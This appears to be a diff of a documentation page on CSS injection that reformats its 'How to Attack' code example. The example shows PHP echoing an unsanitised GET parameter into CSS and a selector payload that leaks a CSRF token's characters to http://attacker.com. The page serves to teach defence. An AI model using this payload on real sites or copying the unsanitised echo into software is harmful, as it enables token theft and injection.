@@ -8,23 +8,17 @@ slug: 'vulnerabilities/cssi'
 
 ### How to Attack
 
-´´´html
-<style>
+```javascript
 p {
     color: <?php echo $_GET['color']; ?>;
     text-align: center;
 }
-</style>
 
-<!-- ################### -->
-
-<style>
 input[name=csrf_token][value=^a] {
     background-image: url(http://attacker.com/log?a);
 }
-</style>
 
-´´´
+```
 
 ### How to protect
 
